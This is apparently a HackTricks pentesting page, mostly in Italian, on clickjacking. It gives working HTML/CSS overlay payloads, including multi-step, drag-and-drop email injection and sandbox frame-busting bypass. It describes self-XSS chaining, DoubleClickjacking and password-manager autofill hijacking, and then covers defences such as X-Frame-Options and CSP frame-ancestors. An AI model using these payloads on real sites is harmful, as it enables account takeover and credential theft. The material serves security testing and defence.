# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Cos'è Clickjacking

In un attacco di clickjacking, un **utente** viene **ingannato** nel **cliccare** un **elemento** su una pagina web che è o **invisibile** o travestito da un elemento diverso. Questa manipolazione può portare a conseguenze non intenzionali per l'utente, come il download di malware, il reindirizzamento a pagine web malevole, la fornitura di credenziali o informazioni sensibili, trasferimenti di denaro o l'acquisto online di prodotti.

### Trucco per precompilare i moduli

A volte è possibile **riempire il valore dei campi di un form usando i parametri GET quando si carica una pagina**. Un attacker può abusare di questo comportamento per compilare un form con dati arbitrari e inviare il payload di clickjacking in modo che l'utente prema il pulsante Submit.

### Popolare un form con Drag\&Drop

Se hai bisogno che l'utente **compili un form** ma non vuoi chiedergli direttamente di inserire informazioni specifiche (come l'email e/o una password specifica che conosci), puoi semplicemente chiedergli di **Drag\&Drop** qualcosa che scriverà i dati da te controllati come in [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Payload di base
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload a più fasi
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Se hai identificato un **XSS che richiede che un utente clicchi** su qualche elemento per **attivare** l'XSS e la pagina è **vulnerabile a clickjacking**, potresti abusarne per indurre l'utente a cliccare il pulsante/link.\
Esempio:\
Hai trovato un **self XSS** in alcuni dettagli privati dell'account (dettagli che **solo tu puoi impostare e leggere**). La pagina con il **form** per impostare questi dettagli è **vulnerabile** a **Clickjacking** e puoi **prepopolare** il **form** con i parametri GET.\
Un attacker potrebbe predisporre un attacco di **Clickjacking** a quella pagina **prepopolando** il **form** con il **XSS payload** e **ingannando** l'**utente** per far cliccare su **Submit** del form. Quindi, **quando il form viene inviato** e i valori sono modificati, l'**utente eseguirà l'XSS**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), this technique would ask the victim to double click on a button of a custom page placed in a specific location, and use the timing differences between mousedown and onclick events to load the victim page duing the double click so the **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Questa tecnica permette di indurre l'utente a cliccare in un solo punto nella pagina vittima bypassando qualsiasi protezione contro il Clickjacking. Quindi l'attaccante deve trovare **azioni sensibili che possono essere eseguite con un solo click, come le richieste OAuth che accettano permessi**.

### Browser extensions: DOM-based autofill clickjacking

Oltre a iframare le pagine vittima, gli attaccanti possono prendere di mira elementi dell'UI delle estensioni del browser iniettati nella pagina. I password manager mostrano dropdown di autofill vicino agli input in focus; concentrando il focus su un campo controllato dall'attaccante e nascondendo/occludendo il dropdown dell'estensione (trucchi di opacity/overlay/top-layer), un click forzato dell'utente può selezionare un elemento memorizzato e riempire dati sensibili in input controllati dall'attaccante. Questa variante non richiede esposizione tramite iframe e funziona interamente tramite manipolazione DOM/CSS.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Gli script eseguiti lato client possono eseguire azioni per prevenire il Clickjacking:

- Assicurarsi che la finestra dell'applicazione sia la top window o la finestra principale.
- Rendere visibili tutti i frame.
- Impedire i click su frame invisibili.
- Rilevare e avvisare gli utenti di potenziali tentativi di Clickjacking.

Tuttavia, questi script di frame-busting possono essere aggirati:

- **Impostazioni di sicurezza del browser:** Alcuni browser potrebbero bloccare questi script in base alle impostazioni di sicurezza o alla mancanza di supporto a JavaScript.
- **HTML5 iframe sandbox Attribute:** Un attaccante può neutralizzare gli script di frame-busting impostando l'attributo sandbox con i valori allow-forms o allow-scripts senza allow-top-navigation. Questo impedisce all'iframe di verificare se è la top window, e.g.
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The allow-forms and allow-scripts values enable actions within the iframe while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like allow-same-origin and allow-modals might be necessary, depending on the attack type. Browser console messages can guide which permissions to allow.

### Difese lato server

#### X-Frame-Options

The **X-Frame-Options HTTP response header** informa i browser sulla legittimità di visualizzare una pagina in un <frame> o <iframe>, aiutando a prevenire Clickjacking:

- X-Frame-Options: deny - Nessun dominio può inserire il contenuto in un frame.
- X-Frame-Options: sameorigin - Solo il sito corrente può inserire il contenuto in un frame.
- X-Frame-Options: allow-from https://trusted.com - Solo l'uri specificato può inserire la pagina in un frame.
- Note the limitations: if the browser doesn't support this directive, it might not work. Some browsers prefer the CSP frame-ancestors directive.

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** è il metodo consigliato per la protezione contro Clickjacking:

- frame-ancestors 'none' - Simile a X-Frame-Options: deny.
- frame-ancestors 'self' - Simile a X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Simile a X-Frame-Options: allow-from.

For instance, the following CSP only allows framing from the same domain:

Content-Security-Policy: frame-ancestors 'self';

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) con child-src e frame-src

**Content Security Policy (CSP)** è una misura di sicurezza che aiuta a prevenire Clickjacking e altri code injection attacks specificando quali sorgenti il browser dovrebbe permettere per caricare contenuti.

#### frame-src Directive

- Definisce le sorgenti valide per i frame.
- Più specifico rispetto alla direttiva default-src.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Questa policy consente frame dalla stessa origine (self) e https://trusted-website.com.

#### child-src Direttiva

- Introdotta in CSP level 2 per definire le sorgenti valide per web workers e frame.
- Agisce come fallback per frame-src e worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Questa policy consente frames e workers dalla stessa origine (self) e https://trusted-website.com.

**Note d'uso:**

- Deprecazione: child-src è in fase di eliminazione a favore di frame-src e worker-src.
- Comportamento di fallback: se frame-src è assente, child-src viene usato come fallback per i frame. Se entrambi sono assenti, viene usato default-src.
- Definizione rigorosa delle fonti: includere solo fonti attendibili nelle direttive per prevenire lo sfruttamento.

#### JavaScript Frame-Breaking Scripts

Sebbene non completamente infallibili, script JavaScript di frame-busting possono essere usati per impedire che una pagina web venga inserita in un frame. Esempio:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Utilizzo di Anti-CSRF Tokens

- **Token Validation:** Usa anti-CSRF tokens nelle applicazioni web per assicurare che le richieste che modificano lo stato vengano effettuate intenzionalmente dall'utente e non tramite una pagina Clickjacked.

## Riferimenti

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
